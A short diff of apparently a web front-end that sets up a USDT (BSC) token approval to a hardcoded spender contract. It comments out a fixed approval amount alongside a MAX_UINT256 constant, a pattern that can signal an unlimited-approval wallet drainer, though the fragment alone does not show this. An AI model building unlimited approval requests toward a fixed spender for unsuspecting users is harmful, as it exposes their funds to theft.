@@ -13,7 +13,7 @@ import '@fontsource/geist';
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
-const approvalAmount = "9024508479"; // USDT amount to approve
+// const approvalAmount = "9024508479"; // USDT amount to approve
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
 const usdtAbi = [
